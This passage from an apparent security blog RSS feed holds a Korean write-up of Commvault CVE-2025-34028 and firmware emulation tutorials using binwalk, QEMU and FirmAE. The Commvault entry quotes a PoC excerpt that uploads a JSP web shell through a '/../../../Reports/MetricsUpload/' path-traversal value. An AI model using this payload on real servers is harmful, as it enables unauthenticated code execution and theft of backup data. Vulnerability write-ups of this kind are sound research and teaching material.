&#xACB0;&#xACFC;&#xAE4C;&#xC9C0; &#xB2E4;&#xC591;&#xD558;&#xAC8C; &#xC54C;&#xC544;&#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xB2E4;&#xC74C; &#xC5F0;&#xAD6C;&#xAE00;&#xC5D0;&#xC11C;&#xB294; Sandbox Escape&#xC744; &#xC8FC;&#xC81C;&#xB85C; &#xB3CC;&#xC544;&#xC624;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;! </p><h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://powerofcommunity.net/poc2024/Csaba%20Fitzl,%20Apple%20Disk-O%20Party.pdf">https://powerofcommunity.net/poc2024/Csaba%20Fitzl,%20Apple%20Disk-O%20Party.pdf</a></p><p><a href="https://github.com/LearningKijo/SecurityResearcher-Note/blob/main/SecurityResearcher-Note-Folder/Day14-macOS-SIP-Bypass-Insights.md">https://github.com/LearningKijo/SecurityResearcher-Note/blob/main/SecurityResearcher-Note-Folder/Day14-macOS-SIP-Bypass-Insights.md</a></p><p><a href="https://www.youtube.com/watch?v=zxZesAN-TEk">https://www.youtube.com/watch?v=zxZesAN-TEk</a></p><p><a href="https://www.offsec.com/blog/macos-kernel-debugging-with-sip/">https://www.offsec.com/blog/macos-kernel-debugging-with-sip/</a></p><p><a href="https://objective-see.org/blog/blog_0x14.html">https://objective-see.org/blog/blog_0x14.html</a></p><p><a href="https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/">https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/</a></p><p><a href="https://media.defcon.org/DEF%20CON%2031/DEF%20CON%2031%20presentations/Jonathan%20Bar%20Or%20Michael%20Pearse%20Anurag%20Bohra%20-%20Getting%20a%20Migraine%20-%20uncovering%20a%20unique%20SIP%20bypass%20on%20macOS.pdf">https://media.defcon.org/DEF%20CON%2031/DEF%20CON%2031%20presentations/Jonathan%20Bar%20Or%20Michael%20Pearse%20Anurag%20Bohra%20-%20Getting%20a%20Migraine%20-%20uncovering%20a%20unique%20SIP%20bypass%20on%20macOS.pdf</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/clalxk/">clalxk</category>
      
      <category domain="https://hackyboiz.github.io/tags/MacOS/">MacOS</category>
      
      <category domain="https://hackyboiz.github.io/tags/TCC-Bypass/">TCC Bypass</category>
      
      
      <comments>https://hackyboiz.github.io/2025/05/11/clalxk/MacOS_SIP-Bypass_ko/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-34028: Commvault Path Traversal 통한 Remote Code Execution 취약점</title>
      <link>https://hackyboiz.github.io/2025/05/10/mungsul/2025-05-10/</link>
      <guid>https://hackyboiz.github.io/2025/05/10/mungsul/2025-05-10/</guid>
      <pubDate>Sat, 10 May 2025 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://labs.watchtowr.com/fire-in-the-hole-were-br</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://labs.watchtowr.com/fire-in-the-hole-were-breaching-the-vault-commvault-remote-code-execution-cve-2025-34028/">https://labs.watchtowr.com/fire-in-the-hole-were-breaching-the-vault-commvault-remote-code-execution-cve-2025-34028/</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Commvault 11.38.0 &#x2013; 11.38.19</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xB370;&#xC774;&#xD130; &#xBC31;&#xC5C5; &#xC194;&#xB8E8;&#xC158;&#xC778; Commvault &#xC5D0;&#xC11C; Remote Code Execution &#xC774; &#xBC1C;&#xACAC;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740;  <code>deployWebpackage.do</code> &#xC640; <code>deployServiceCommcell.do</code> &#xB450; &#xACF3;&#xC5D0;&#xC11C; &#xD2B8;&#xB9AC;&#xAC70; &#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. <code>deployWebpackage.do</code> &#xB85C; &#xD2B8;&#xB9AC;&#xAC70;&#xD558;&#xBA74; &#xC678;&#xBD80; &#xC11C;&#xBC84;&#xC5D0;&#xC11C; zip &#xD30C;&#xC77C;&#xC744; &#xAC16;&#xACE0; &#xC624;&#xACE0; <code>deployServiceCommcell.do</code> &#xB294; zip &#xD30C;&#xC77C;&#xC744; &#xBC14;&#xB85C; &#xC5C5;&#xB85C;&#xB4DC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB450; &#xC5D4;&#xB4DC;&#xD3EC;&#xC778;&#xD2B8; &#xBAA8;&#xB450; <code>deployCCPackage</code> &#xBA54;&#xC18C;&#xB4DC;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294;&#xB370;&#xC694;. &#xC5EC;&#xAE30;&#xC5D0;&#xC11C; <code>servicePack</code> &#xD30C;&#xB77C;&#xBA54;&#xD130;&#xC5D0; &#xAC80;&#xC99D;&#xC774; &#xC5C6;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC555;&#xCD95;&#xC744; &#xD480; &#xB54C; &#xC0C1;&#xC704; &#xB514;&#xB809;&#xD1A0;&#xB9AC; &#xC811;&#xADFC;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">deployCCPackage</span><span class="hljs-params">(String servicePack)</span> <span class="hljs-keyword">throws</span> IOException </span>{       String BASE_PATH = <span class="hljs-keyword">this</span>.extractPath(<span class="hljs-keyword">this</span>.fileZipUtil.getResourcePath(<span class="hljs-string">&quot;&quot;</span>), <span class="hljs-keyword">false</span>);       String CC_DEPLOY_PATH = BASE_PATH + File.separator + <span class="hljs-string">&quot;Apache&quot;</span> + File.separator + <span class="hljs-string">&quot;conf&quot;</span> + File.separator + <span class="hljs-string">&quot;ccPackages&quot;</span> + File.separator;       String DIST_CC_PATH = BASE_PATH + File.separator + <span class="hljs-string">&quot;AdminConsole&quot;</span> + File.separator + <span class="hljs-string">&quot;dist-cc-sps&quot;</span> + File.separator;       String TEMP_DIR = servicePack + <span class="hljs-string">&quot;.tmp&quot;</span> + File.separator + <span class="hljs-string">&quot;dist-cc&quot;</span>;       String SERVICEPACK_DEPLOY_PATH = DIST_CC_PATH + servicePack + <span class="hljs-string">&quot;.tmp&quot;</span>;        File dir = <span class="hljs-keyword">new</span> File(SERVICEPACK_DEPLOY_PATH);       <span class="hljs-keyword">if</span> (dir.exists()) {           FileUtils.deleteDirectory(dir);       }   <span class="hljs-keyword">this</span>.fileZipUtil.unzipFileWrtAbsPath(CC_DEPLOY_PATH + servicePack + File.separator + <span class="hljs-string">&quot;dist-cc.zip&quot;</span>, DIST_CC_PATH + TEMP_DIR);</code></pre><p>PoC &#xCF54;&#xB4DC;&#xC758; &#xC77C;&#xBD80;&#xB97C; &#xBCF4;&#xBA74; &#xC6F9; &#xC11C;&#xBC84;&#xC5D0;&#xC11C; &#xC811;&#xADFC; &#xAC00;&#xB2A5;&#xD55C; <code>/Reports/MetricsUpload/</code> &#xCABD;&#xC744; &#xB300;&#xC0C1;&#xC73C;&#xB85C; servicePack &#xBCC0;&#xC218;&#xB97C; &#xC138;&#xD305;[1]&#xD574;&#xC11C; &#xC6F9;&#xC258; &#xC5C5;&#xB85C;&#xB4DC;&#xB97C; &#xC2DC;&#xD0A4;&#xB294; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs java">...random_path = <span class="hljs-string">&apos;&apos;</span>.join(random.choice(string.ascii_letters + string.digits) <span class="hljs-function"><span class="hljs-keyword">for</span> _ in <span class="hljs-title">range</span><span class="hljs-params">(<span class="hljs-number">8</span>)</span>)</span><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(f<span class="hljs-string">&quot;[*] Uploading to  /reports/MetricsUpload/{random_path}/&quot;</span>)</span></span><span class="hljs-function">upload_url </span>= f<span class="hljs-string">&quot;{args.url}/commandcenter/deployServiceCommcell.do&quot;</span>upload_headers = {<span class="hljs-string">&quot;User-Agent&quot;</span>: <span class="hljs-string">&quot;CommvaultRCEPoC&quot;</span>, <span class="hljs-string">&quot;Accept&quot;</span>: <span class="hljs-string">&quot;*/*&quot;</span>}upload_form = {         &apos;servicePack&apos;: (None, f&apos;/../../../Reports/MetricsUpload/{random_path}/&apos;, &apos;text/plain&apos;), # [1]        <span class="hljs-string">&apos;version&apos;</span>: (None, <span class="hljs-string">&apos;12.45&apos;</span>, <span class="hljs-string">&apos;text/plain&apos;</span>),        <span class="hljs-string">&apos;file&apos;</span>: (<span class="hljs-string">&apos;file.zip&apos;</span>, shell, <span class="hljs-string">&apos;application/octet-stream&apos;</span>)}requests.post(upload_url, headers=upload_headers, files=upload_form, verify=False)shell_url = f<span class="hljs-string">&quot;{args.url}/reports/MetricsUpload/{random_path}/.tmp/dist-cc/dist-cc/shell.jsp&quot;</span>...</code></pre><p>&#xCC38;&#xACE0;&#xC790;&#xB8CC;&#xC5D0; &#xB530;&#xB974;&#xBA74; &#xC2EC;&#xC9C0;&#xC5B4; &#xC774; &#xC5D4;&#xB4DC;&#xD3EC;&#xC778;&#xD2B8;&#xB4E4;&#xC740; &#xC778;&#xC99D;&#xC744; &#xC218;&#xD589;&#xD558;&#xC9C0; &#xC54A;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; preauth &#xB85C;&#xB3C4; &#xD2B8;&#xB9AC;&#xAC70;&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xD574;&#xB2F9; &#xC194;&#xB8E8;&#xC158;&#xC740; SaaS &#xB85C;&#xB3C4; &#xC81C;&#xACF5;&#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC678;&#xBD80;&#xB85C; &#xC624;&#xD508;&#xB418;&#xC5B4; &#xC788;&#xB2E4;&#xBA74; RCE &#xB85C; &#xC778;&#xD574; &#xAD8C;&#xD55C;&#xC774; &#xD0C8;&#xCDE8;&#xB2F9;&#xD558;&#xACE0; &#xBC31;&#xC5C5;&#xB41C; &#xB370;&#xC774;&#xD130;&#xB4E4; &#xAE4C;&#xC9C0;&#xB3C4; &#xC601;&#xD5A5;&#xC744; &#xBBF8;&#xCE60; &#xC218; &#xC788;&#xC5B4; &#xD30C;&#xAE09;&#xB825;&#xC774; &#xB192;&#xC544;&#xBCF4;&#xC774;&#xB124;&#xC694;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><p><a href="https://labs.watchtowr.com/fire-in-the-hole-were-breaching-the-vault-commvault-remote-code-execution-cve-2025-34028/">https://labs.watchtowr.com/fire-in-the-hole-were-breaching-the-vault-commvault-remote-code-execution-cve-2025-34028/</a></p></li><li><p><a href="https://github.com/watchtowrlabs/watchTowr-vs-Commvault-PreAuth-RCE-CVE-2025-34028/blob/main/watchtowr-vs-commvault-rce-CVE-2025-34028.py">https://github.com/watchtowrlabs/watchTowr-vs-Commvault-PreAuth-RCE-CVE-2025-34028/blob/main/watchtowr-vs-commvault-rce-CVE-2025-34028.py</a></p></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/Remote-Code-Execution/">Remote Code Execution</category>
      
      <category domain="https://hackyboiz.github.io/tags/Path-Traversal/">Path Traversal</category>
      
      <category domain="https://hackyboiz.github.io/tags/mungsul/">mungsul</category>
      
      <category domain="https://hackyboiz.github.io/tags/Commvault/">Commvault</category>
      
      
      <comments>https://hackyboiz.github.io/2025/05/10/mungsul/2025-05-10/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Firmware Emulation with FirmAE Part 1 (en)</title>
      <link>https://hackyboiz.github.io/2025/05/08/newp1ayer48/emulation1/en/</link>
      <guid>https://hackyboiz.github.io/2025/05/08/newp1ayer48/emulation1/en/</guid>
      <pubDate>Thu, 08 May 2025 14:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;Hello! I&amp;#x2019;m newp1ayer48, the one in charge of the low-level at Hackyboiz! &amp;#x1F938;&amp;#x1F3FB;&amp;#x200D;&amp;#x2642;&amp;#xFE0F;&lt;/p&gt;
&lt;p&gt;In the </description>
        
      
      
      
      <content:encoded><![CDATA[<p>Hello! I&#x2019;m newp1ayer48, the one in charge of the low-level at Hackyboiz! &#x1F938;&#x1F3FB;&#x200D;&#x2642;&#xFE0F;</p><p>In the previous post, I said I&#x2019;d return to debugging port connections, but due to budget constraints, I&#x2019;m back with a different topic! (E<del>mbedded hacking is all about pay-to-win&#x2026;</del>&#x1F4B8;)</p><p>Once you&#x2019;ve acquired the firmware and examined the file system, it&#x2019;s time to dive into the fun part&#x2014;analyzing it for vulnerabilities.</p><p>But&#x2026; relying solely on static analysis to find vulnerabilities is hardly an ideal situation. Even in pwnable challenges we use GDB, so how long are we just going to stare at IDA? &#x1F620;</p><p>That&#x2019;s why humans have always found a way. The answer is emulation!</p><p><img src="image01.jpg" alt="image01.jpg"></p><h2 id="1-Simulation-vs-Emulation"><a href="#1-Simulation-vs-Emulation" class="headerlink" title="1. Simulation vs Emulation"></a>1. Simulation vs Emulation</h2><p>Since the processes of building simulations and emulations can be quite similar, it&#x2019;s easy to confuse the two. But the biggest difference lies in their goals.</p><p>The main purpose of <strong>simulation</strong> is to test whether a program or system behaves correctly in a certain environment or scenario, often as a form of rehearsal. Rather than fully replicating the entire environment, simulations may only implement the minimum necessary parts and skip detailed functions. Sometimes, real hardware is used in the setup.</p><p>To put it simply, think of simulator games! These often don&#x2019;t replicate every feature perfectly, but their main purpose is to provide an experience or allow practice. &#x1F579;&#xFE0F;</p><p><img src="image02.webp" alt="image02.webp"></p><p><strong>Emulation</strong>, on the other hand, focuses on running a program or system in a different environment. Since the original hardware setup may be unavailable, it&#x2019;s important to mimic the hardware in software. The goal is often to make every function work as it would on the real system, so most emulations aim to replicate everything in detail.</p><p>You can think of emulation like Nintendo or Android emulators! Their main purpose is to let you run games or apps in a PC environment, so they&#x2019;re designed to support all the functions of those systems. &#x1F4F1;</p><p><img src="image03.png" alt="image03.png"></p><p>To summarize, the image below (not shown here) illustrates the key difference well.</p><p><img src="image04.jpg" alt="image04.jpg"></p><p>Back to embedded hacking&#x2014;our main goal is to perform <strong>dynamic analysis</strong> of the firmware we&#x2019;ve obtained. Embedded devices rely heavily on various sensors and hardware, so if the required hardware dependencies aren&#x2019;t met, they often won&#x2019;t function. Also, embedded systems typically use RISC architectures like ARM or MIPS, which means we have to emulate them in environments different from our typical CISC-based analysis systems. And since we want to dynamically analyze all the device&#x2019;s functions, nearly every feature must be executable. &#x1F477;&#x1F3FB;</p><p>Therefore, we need to view the firmware from an emulation perspective and build the appropriate environment. The prevalence of articles in embedded hacking that involve firmware emulation supports this approach!</p><h2 id="2-Firmware-Analysis"><a href="#2-Firmware-Analysis" class="headerlink" title="2. Firmware Analysis"></a>2. Firmware Analysis</h2><p>To emulate firmware, the first step is to analyze the environment in which it was built and is supposed to run. &#x261D;&#x1F3FB;</p><p><img src="image05.jpg" alt="image05.jpg"></p><p>With <code>binwalk</code>, you can extract several key pieces of information from firmware:</p><ul><li>Architecture</li><li>Kernel</li><li>Root File System</li></ul><p>Using binwalk, you can discover the architecture and kernel details of a sample firmware.</p><pre><code class="hljs bash">binwalk firmware.bin</code></pre><p><img src="image06.png" alt="image06.png"></p><p>The <code>-A</code> option provides more detailed architecture info. &#x1F50D;</p><p>The <code>-e</code> option extracts files from the identified sections.</p><p>The files extracted by binwalk often have numeric names, which correspond to the different regions of the firmware. By checking the addresses listed by binwalk, you can identify what each file is.</p><pre><code class="hljs bash">binwalk -e firmware.binbinwalk -A kernel</code></pre><p><img src="image07.png" alt="image07.png"></p><p>Embedded systems commonly use RISC architectures like ARM and MIPS. However, even within these, naming can differ depending on the endianness. &#x1F95A;</p><p>For example, <code>mips</code> typically uses big-endian, while <code>mipsel</code> uses little-endian. Binwalk usually detects and displays the architecture correctly, so just keep an eye on that.</p><h2 id="3-QEMU"><a href="#3-QEMU" class="headerlink" title="3. QEMU"></a>3. QEMU</h2><p>Once you&#x2019;ve identified the firmware&#x2019;s details, it&#x2019;s time to emulate it. Firmware can be run on a QEMU virtual machine. &#x1F4A8;</p><p><img src="image08.jpg" alt="image08.jpg"></p><p>QEMU is a virtualization tool frequently used to quickly set up emulation environments. You can specify kernel, image files, and other options. It&#x2019;s installable via <code>apt</code>.</p><p>In the case of router firmware, there often aren&#x2019;t many extra hardware or sensor dependencies beyond the firmware itself. So, if the kernel and image are configured correctly, the firmware can be run right away.</p><p>You can download architecture-specific files via the links provided (not shown here). &#x1F4BE;</p><p><a href="https://people.debian.org/~aurel32/qemu/">https://people.debian.org/~aurel32/qemu/</a></p><p>If you manually match the necessary files and set up the network, you&#x2019;ll be able to access the router&#x2019;s interface like below and use most of the functionality present in the root file system. &#x1F310;</p><p><img src="image09.jpg" alt="image09.jpg"></p><p>source: Bach`s Blog</p><h2 id="4-FirmAE"><a href="#4-FirmAE" class="headerlink" title="4. FirmAE"></a>4. FirmAE</h2><p>QEMU requires manual setup for networking and file configurations, which can be cumbersome.</p><p>But once again, humans found a way! There&#x2019;s a tool that simplifies emulation&#x2026;</p><p>And that tool is the main subject of this post: <strong>FirmAE</strong>! &#x1F941;</p><p><a href="https://github.com/pr0v3rbs/FirmAE">https://github.com/pr0v3rbs/FirmAE</a></p><p><img src="image10.png" alt="image10.png"></p><p>FirmAE is a firmware emulation automation tool developed by KAIST SysSec Lab. The research team created it to simplify the emulation of router and IP camera firmware images. It&#x2019;s built on QEMU and Binwalk. &#x1F528;</p><p>You can install and run it via GitHub.</p><pre><code class="hljs bash"><span class="hljs-comment"># download</span>sudo apt-get install -y bc fdisk qemu qemu-system-mips64 python3-psycopg2git <span class="hljs-built_in">clone</span> --recursive https://github.com/pr0v3rbs/FirmAE<span class="hljs-built_in">cd</span> ./FirmAE./download.sh./install.sh./init.sh<span class="hljs-comment"># firmware in FirmAE/firmwares </span>sudo ./run.sh -c VENDOR ./firmwares/sudo ./run.sh -d VENDOR ./firmwares/</code></pre><p>When you emulate a sample router firmware using FirmAE, you can access the router&#x2019;s web page just like before! The emulation process can take a fair bit of time, so be patient&#x2014;it typically takes around 20&#x2013;30 minutes (!). &#x2615;</p><p><img src="image11.png" alt="image11.png"></p><p>However, as indicated in the options, FirmAE was developed based on models from well-known router and IP camera manufacturers tested by the research team. As a result, it may not work well with less common devices or other embedded/IoT products. It also offers <code>gdbserver</code> functionality, but this often doesn&#x2019;t work reliably either. &#x1F972;</p><p><img src="image12.jpg" alt="image12.jpg"></p><p>In <strong>Part 2</strong>, I&#x2019;ll explore FirmAE&#x2019;s internal structure and how it works, and show how to emulate firmware in different environments and use the various features it provides effectively! &#x1F919;&#x1F3FB;</p><p>Thanks for reading!</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/firmware/">firmware</category>
      
      <category domain="https://hackyboiz.github.io/tags/newp1ayer48/">newp1ayer48</category>
      
      <category domain="https://hackyboiz.github.io/tags/Embedded/">Embedded</category>
      
      <category domain="https://hackyboiz.github.io/tags/Emulation/">Emulation</category>
      
      
      <comments>https://hackyboiz.github.io/2025/05/08/newp1ayer48/emulation1/en/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Firmware Emulation with FirmAE Part 1 (ko)</title>
      <link>https://hackyboiz.github.io/2025/05/08/newp1ayer48/emulation1/ko/</link>
      <guid>https://hackyboiz.github.io/2025/05/08/newp1ayer48/emulation1/ko/</guid>
      <pubDate>Thu, 08 May 2025 14:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;&amp;#xC548;&amp;#xB155;&amp;#xD558;&amp;#xC138;&amp;#xC694;! Hackyboiz&amp;#xC5D0;&amp;#xC11C; &amp;#xAC00;&amp;#xC7A5; &amp;#xB0AE;&amp;#xC740; &amp;#xACF3;(low-level)&amp;#xC744; &amp;#xB9E1</description>
        
      
      
      
      <content:encoded><![CDATA[<p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;! Hackyboiz&#xC5D0;&#xC11C; &#xAC00;&#xC7A5; &#xB0AE;&#xC740; &#xACF3;(low-level)&#xC744; &#xB9E1;&#xACE0; &#xC788;&#xB294; <code>newp1ayer48</code> &#xC785;&#xB2C8;&#xB2E4;! &#x1F938;&#x1F3FB;&#x200D;&#x2642;&#xFE0F;</p><p>&#xC774;&#xC804; &#xAE00;&#xC5D0;&#xC11C; &#xB514;&#xBC84;&#xAE45; &#xD3EC;&#xD2B8; &#xC5F0;&#xACB0;&#xB85C; &#xB3CC;&#xC544;&#xC624;&#xAE30;&#xB85C; &#xD588;&#xC9C0;&#xB9CC;, &#xAE08;&#xC804; &#xC774;&#xC288;&#xB85C; &#xC778;&#xD574; &#xB2E4;&#xB978; &#xC8FC;&#xC81C;&#xB85C; &#xB3CC;&#xC544;&#xC654;&#xC2B5;&#xB2C8;&#xB2E4;! (<del>&#xC784;&#xBCA0;&#xB514;&#xB4DC; &#xD574;&#xD0B9;&#xC740; &#xD604;&#xC9C8; &#xBE68;&#x2026;</del>&#x1F4B8;)</p><p>&#xD38C;&#xC6E8;&#xC5B4;&#xB97C; &#xD68D;&#xB4DD;&#xD558;&#xACE0; &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C;&#xAE4C;&#xC9C0; &#xD655;&#xC778;&#xD588;&#xC73C;&#xBA74; &#xC774;&#xC81C; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xAE30; &#xC704;&#xD574; &#xC990;&#xAC70;&#xC6B4; &#xBD84;&#xC11D;&#xC744; &#xD560; &#xCC28;&#xB840;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB7EC;&#xB098;&#x2026; &#xC815;&#xC801; &#xBD84;&#xC11D;&#xC73C;&#xB85C;&#xB9CC; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xB294;&#xB2E4;&#xB294; &#xAC83;&#xC740; &#xC369; &#xC720;&#xCF8C;&#xD55C; &#xC0C1;&#xD669;&#xC740; &#xC544;&#xB2C8;&#xC8E0;. &#xD3EC;&#xB108;&#xBE14;&#xD560; &#xB54C;&#xB3C4; gdb&#xB294; &#xBCF4;&#xB294;&#xB370;, &#xC5B8;&#xC81C;&#xAE4C;&#xC9C0; IDA&#xB9CC; &#xCCD0;&#xB2E4;&#xBCF4;&#xACE0; &#xC788;&#xC744; &#xAC81;&#xB2C8;&#xAE4C;.. &#x1F620;</p><p>&#xADF8;&#xB807;&#xAE30;&#xC5D0; &#xC778;&#xAC04;&#xC740; &#xC5B8;&#xC81C;&#xB098; &#xBC29;&#xBC95;&#xC744; &#xB9CC;&#xB4E4;&#xC5B4; &#xB193;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBC14;&#xB85C; &#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xD305;&#xC774;&#xC8E0;!</p><p><img src="image01.jpg" alt="image01.jpg"></p><h2 id="1-&#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158;-Simulation-vs-&#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xC158;-Emulation"><a href="#1-&#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158;-Simulation-vs-&#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xC158;-Emulation" class="headerlink" title="1. &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158;(Simulation) vs &#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xC158;(Emulation)"></a>1. &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158;(<strong>Simulation</strong>) vs &#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xC158;(Emulation)</h2><p>&#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158;&#xACFC; &#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xC158;&#xC740; &#xAD6C;&#xCD95; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xBE44;&#xC2B7;&#xD55C; &#xBD80;&#xBD84;&#xC774; &#xB9CE;&#xC774; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xAC04;&#xD639; &#xAD6C;&#xBD84;&#xC774; &#xC5B4;&#xB824;&#xC6B8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xAC00;&#xC7A5; &#xD070; &#xCC28;&#xC774;&#xC810;&#xC740; &#xD558;&#xACE0;&#xC790; &#xD558;&#xB294; &#xBAA9;&#xD45C;&#xC5D0;&#xC11C; &#xB098;&#xB269;&#xB2C8;&#xB2E4;.</p><p>&#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158;&#xC758; &#xC8FC; &#xBAA9;&#xC801;&#xC740; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xB610;&#xB294; &#xC2DC;&#xC2A4;&#xD15C;&#xC774; &#xD574;&#xB2F9; &#xD658;&#xACBD;&#xC774;&#xB098; &#xC0C1;&#xD669;&#xC5D0;&#xC11C; &#xAE30;&#xBCF8;/&#xD2B9;&#xC815; &#xB3D9;&#xC791;&#xC774; &#xAC00;&#xB2A5;&#xD55C;&#xC9C0;, &#xC608;&#xD589; &#xC5F0;&#xC2B5;&#xC744; &#xC704;&#xD574; &#xD14C;&#xC2A4;&#xD2B8;&#xB97C; &#xD574;&#xBCF4;&#xB294; &#xC131;&#xACA9;&#xC774; &#xAC15;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB798;&#xC11C; &#xC885;&#xC885; &#xBAA8;&#xB4E0; &#xD658;&#xACBD;&#xACFC; &#xC0C1;&#xD669;&#xC744; &#xAD6C;&#xCD95;&#xD558;&#xB294; &#xAC83;&#xC774; &#xC544;&#xB2CC;, &#xD544;&#xC218; &#xB3D9;&#xC791;&#xC774; &#xAC00;&#xB2A5;&#xD55C; &#xCD5C;&#xC18C;&#xD55C;&#xB9CC; &#xAD6C;&#xCD95;&#xD558;&#xACE0; &#xC138;&#xBD80; &#xAE30;&#xB2A5;&#xAE4C;&#xC9C0;&#xB294; &#xAD6C;&#xD604;&#xD558;&#xC9C0; &#xC54A;&#xB294; &#xACBD;&#xC6B0;&#xAC00; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xD658;&#xACBD; &#xAD6C;&#xC131; &#xC2DC;, &#xC2E4;&#xC81C; &#xD558;&#xB4DC;&#xC6E8;&#xC5B4;&#xB85C; &#xD658;&#xACBD;&#xC744; &#xB9DE;&#xCD94;&#xB294; &#xACBD;&#xC6B0;&#xB3C4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC27D;&#xAC8C; &#xBE44;&#xC720;&#xD558;&#xC790;&#xBA74;, &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158;&#xC740; &#xB2E4;&#xC591;&#xD55C; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xD130; &#xAC8C;&#xC784;&#xC744; &#xC0DD;&#xAC01;&#xD558;&#xBA74; &#xC88B;&#xC2B5;&#xB2C8;&#xB2E4;! &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xD130; &#xAC8C;&#xC784;&#xC5D0;&#xC11C;&#xB294; &#xBAA8;&#xB4E0; &#xAE30;&#xB2A5;&#xC744; &#xC644;&#xBCBD;&#xD558;&#xAC8C; &#xC77C;&#xCE58; &#xC2DC;&#xCF1C; &#xAD6C;&#xD604;&#xD558;&#xC9C0; &#xC54A;&#xC740; &#xACBD;&#xC6B0;&#xB3C4; &#xB9CE;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xD130;&#xB294; &#xD55C; &#xBC88; &#xACBD;&#xD5D8;&#xD558;&#xACE0; &#xC5F0;&#xC2B5;&#xD55C;&#xB2E4;&#xB294; &#xAC83;&#xC774; &#xC8FC;&#xBAA9;&#xC801;&#xC73C;&#xB85C; &#xB9CC;&#xB4E4;&#xC5B4;&#xC838; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#x1F579;&#xFE0F;</p><p><img src="image02.webp" alt="image02.webp"></p><p>&#xC5D0;&#xBBAC;&#xB808;&#xC774;&#xC158;&#xC758; &#xC8FC; &#xBAA9;&#xC801;&#xC740; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xB610;&#xB294; &#xC2DC;&#xC2A4;&#xD15C;&#xC774; &#xB2E4;&#xB978; &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xAD6C;&#xB3D9; &#xC2DC;&#xD0A4;&#xB824;&#xB294; &#xC131;&#xACA9;&#xC774; 